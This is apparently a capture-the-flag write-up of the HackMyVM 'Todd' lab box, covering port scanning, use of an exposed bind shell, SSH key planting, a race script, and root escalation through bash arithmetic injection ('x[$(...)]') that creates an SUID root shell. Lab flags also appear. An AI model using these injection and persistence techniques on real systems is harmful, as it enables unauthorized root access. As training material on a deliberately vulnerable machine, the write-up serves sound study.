# Todd

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.56:22
Open 10.0.2.56:80
Open 10.0.2.56:5089
Open 10.0.2.56:6606
Open 10.0.2.56:7066
Open 10.0.2.56:8415
Open 10.0.2.56:12351
Open 10.0.2.56:16063
Open 10.0.2.56:16322
Open 10.0.2.56:25452
Open 10.0.2.56:30345
Open 10.0.2.56:31378
Open 10.0.2.56:31597
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.56

PORT      STATE  SERVICE REASON       VERSION
22/tcp    open   ssh     syn-ack      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKpc4iyFhIzxDvlJoPvgE9rRlFPOqHm4EkLgqXQkVf31csyjpvJgyZpTgr4gYV3oztsMmQbIj+nFGD+L5pQfaSXtAdxKpqt4D/MnFqVKP6KKGFhATWMCDzGXRaXQyaF7dOq49vkIoptczAU2af2PfwycA3aaI/lNPOYSHPRufkm102lE/lHZzNbXh0yJJXy9RJaqELeAibmqdrHFNpXFT8qAvsQrz/6IKJkia4JLdVbfeMdZBOQ9lIlQg+2VfKXp7pF7kGZKKttIThc8ROqlcOaxlmuC5oKEgFQP7obty1+6fx/QIuNn3D05FeQMqbvJfFZF1dE2IH4WEbFWRGH6w1
|   256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAYupwIuJVRtRMDrYZ6fR/3p5E5vsqXADwGAoZ2RW5vKPxDV3j/+QjGbnRDj1iD5/iwZxxlUggSr5raZfzAHrZA=
|   256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAOshh8VG4l9hWlVYWfAvLuWuwPEdiF8EXmm5BFib/+q
80/tcp    open   http    syn-ack      Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Mindful Listening
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
5089/tcp  closed unknown conn-refused
6606/tcp  closed unknown conn-refused
7066/tcp  closed unknown conn-refused
8415/tcp  closed dlpx-sp conn-refused
12351/tcp closed unknown conn-refused
16063/tcp closed unknown conn-refused
16322/tcp closed unknown conn-refused
25452/tcp closed unknown conn-refused
30345/tcp closed unknown conn-refused
31378/tcp closed unknown conn-refused
31597/tcp closed unknown conn-refused
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/todd/writeup.png)

```bash
└─$ feroxbuster -u http://todd.hmv -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php,.html,.txt -S 273
200      GET       75l      171w     2060c http://todd.hmv/
200      GET       75l      171w     2060c http://todd.hmv/index.html
301      GET        9l       28w      304c http://todd.hmv/tools => http://todd.hmv/tools/
```

![writeup-1.png](/assets/pentest/hackmyvm/todd/writeup-1.png)

Hmm.. nothing too useful.

Before starting box I scanned the target few times, because it had closed ports and usually they are not shown in scan if they are closed. Each scan also had different closed ports, something is happening in background...
```bash
└─$ for i in {1..10}; do nmap -p- -T5 10.0.2.56 | grep -oP '^\d+'; done | sort | uniq -c
      1 10153
      1 12009
      1 12353
      1 12725
      1 14756
      1 1604
      1 17157
      1 20303
      1 21461
     10 22
      1 24359
      1 2455
      1 25109
      1 26082
      1 26167
      1 27663
      1 28450
      1 2940
      1 31453
      1 31871
      2 7066
     10 80
     
 └─$ for i in {1..10}; do nmap -p- -T5 10.0.2.56 | grep -P '^\d+'; done | sort | uniq -c | sort -nr
  8 80/tcp open  http
  8 22/tcp open  ssh
  2 80/tcp    open  http
  2 7066/tcp  open  unknown
  2 22/tcp    open  ssh
  1 8695/tcp  open  unknown
  1 7265/tcp  open  unknown
  1 3445/tcp  open  monp
  1 30808/tcp open  unknown
  1 29815/tcp open  unknown
  1 28549/tcp open  unknown
  1 27652/tcp open  unknown
  1 1764/tcp  open  landesk-rc
  1 13934/tcp open  unknown
```

## Bind Shell

After scanning target many times port `7066` appears again 

```bash
└─$ nc todd.hmv 7066
help
GNU bash, version 5.0.3(1)-release (x86_64-pc-linux-gnu)
id
uid=1000(todd) gid=1000(todd) groups=1000(todd)
---
└─$ ssh-keygen -f id_rsa -q -P x && cat id_rsa.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPjZPu9TJQU0RmPugRO1ufDmchXutnhRi7E7QmUQhhr1 woyag@kraken
---
mkdir ~/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPjZPu9TJQU0RmPugRO1ufDmchXutnhRi7E7QmUQhhr1 woyag@kraken' > ~/.ssh/authorized_keys
```

## SSH

```bash
└─$ ssh -i id_rsa todd@todd.hmv
$ /bin/bash
todd@todd:~$ id
uid=1000(todd) gid=1000(todd) groups=1000(todd)
```

### User.txt

```bash
todd@todd:~$ cat user.txt
Todd{eb93009a2719640de486c4f68daf62ec}
```

## Privilege Escalation

```bash
todd@todd:~$ sudo -l
Matching Defaults entries for todd on todd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User todd may run the following commands on todd:
    (ALL : ALL) NOPASSWD: /bin/bash /srv/guess_and_check.sh
    (ALL : ALL) NOPASSWD: /usr/bin/rm
    (ALL : ALL) NOPASSWD: /usr/sbin/reboot
```

First remove annoying script which kills `todd` shell, you can identify cronjobs via pspy
```bash
todd@todd:/opt$ sudo rm /opt/kill_todd.sh
```

```bash
todd@todd:~$ cat /srv/guess_and_check.sh
#!/bin/bash

# check this script used by human
a=$((RANDOM%1000))
echo "Please Input [$a]"

echo "[+] Check this script used by human."
echo "[+] Please Input Correct Number:"
read -p ">>>" input_number

[[ $input_number -ne "$a" ]] && exit 1

sleep 0.2
true_file="/tmp/$((RANDOM%1000))"
sleep 1
false_file="/tmp/$((RANDOM%1000))"

[[ -f "$true_file" ]] && [[ ! -f "$false_file" ]] && cat /root/.cred || exit 2
```

From the first look I saw `sleep` commands and thought [TOCTOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use). But only after a while I realized that Im stupid and files are actually random, not dependent on `$a` at all...
```bash
#!/usr/bin/env bash
set -euo pipefail

TARGET="/srv/guess_and_check.sh"
OUT="/tmp/guess_out.$$"
FIFO="/tmp/guess_in.$$"

log() { printf "[%(%H:%M:%S)T] %s\n" -1 "$*"; }

cleanup() {
    local exit_code=$?
    log "Cleaning up..."
    [[ -n "${TARGET_PID:-}" ]] && kill "$TARGET_PID" 2>/dev/null && log "Killed target PID $TARGET_PID"
    rm -f "$OUT" "$FIFO" /tmp/{0..1000} 2>/dev/null || true
    [[ $exit_code -ne 0 ]] && log "Script failed with exit code $exit_code"
    exit $exit_code
}
trap cleanup EXIT INT TERM

log "Creating dummy files 0-1000..."
touch /tmp/{0..1000} 2>/dev/null

log "Starting race exploit on $TARGET"

[[ -e "$FIFO" ]] && rm -f "$FIFO"
mkfifo "$FIFO" || { log "Failed to create FIFO"; exit 1; }
log "Created FIFO: $FIFO"

log "Launching target with sudo..."
sudo /bin/bash "$TARGET" <"$FIFO" >"$OUT" 2>&1 &
TARGET_PID=$!
log "Started target PID $TARGET_PID"

# Open writer (won't block since target is reading)
exec 3> "$FIFO"
log "Opened FIFO writer on FD 3"

# wait for prompt with timeout
log "Waiting for input prompt..."
sleep 0.1 # Allow program to output

N=$(grep -oP '\d+' "$OUT" | head -n1)
[[ -z "$N" ]] && { log "Failed to extract number"; exit 1; }
log "Extracted target number: $N"

log "Sending number $N to target..."
printf "%s\n" "$N" >&3
exec 3>&-  # Close writer so target sees EOF
log "Input sent, FIFO closed"

# Race condition: remove file after delay
log "Starting race condition (0.7s delay)..."
{ 
    sleep 0.7;
    sudo /usr/bin/rm -f "/tmp/$N"; 
} &
RACE_PID=$!
wait "$RACE_PID" 2>/dev/null || true

cat "$OUT"
```

[https://mywiki.wooledge.org/BashPitfalls?utm_source=DigitalOcean_Newsletter#A.5B_.24foo_.3D_.22bar.22_.5D](https://mywiki.wooledge.org/BashPitfalls?utm_source=DigitalOcean_Newsletter#A.5B_.24foo_.3D_.22bar.22_.5D)

Following line if vulnerable to code injection inside `test` or `[[ ... ]]`
```bash
[[ $input_number -ne "$a" ]] && exit 1
```

I couldn't find exact Stack Overflow page, but you can get RCE via `x[$(COMMAND)]`
```bash
todd@todd:~$ echo 'x[$(id)]' | sudo /bin/bash /srv/guess_and_check.sh >/dev/null
/srv/guess_and_check.sh: line 35: uid=0(root) gid=0(root) groups=0(root): syntax error in expression (error token is "(root) gid=0(root) groups=0(root)")

todd@todd:~$ echo 'x[$(install /bin/bash /tmp/rootbash -m4777)]' | sudo /bin/bash /srv/guess_and_check.sh
todd@todd:~$ /tmp/rootbash -p
rootbash-5.0# id
uid=1000(todd) gid=1000(todd) euid=0(root) groups=1000(todd)
rootbash-5.0# cd /root
rootbash-5.0# ls -Alh
total 32K
lrwxrwxrwx 1 root root    9 Feb 18  2025 .bash_history -> /dev/null
-rw-r--r-- 1 root root  571 Mar 22 08:06 .bashrc
-rw-r--r-- 1 root root   14 Mar 22 08:30 .cred
drwxr-xr-x 3 root root 4.0K Nov 13  2020 .local
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw------- 1 root root   39 Mar 22 06:44 root.txt
-rw-r--r-- 1 root root   66 Nov 13  2020 .selected_editor
drwxr-xr-x 2 root root 4.0K Mar 22 06:32 .ssh
-rw------- 1 root root 1.5K Mar 22 11:08 .viminfo
rootbash-5.0# cat .cred
fake password
```

Nice... even if TOCTOU would have worked password was fake all along

### Root.txt

```
rootbash-5.0# cat root.txt
Todd{389c9909b8d6a701217a45104de7aa21}
```

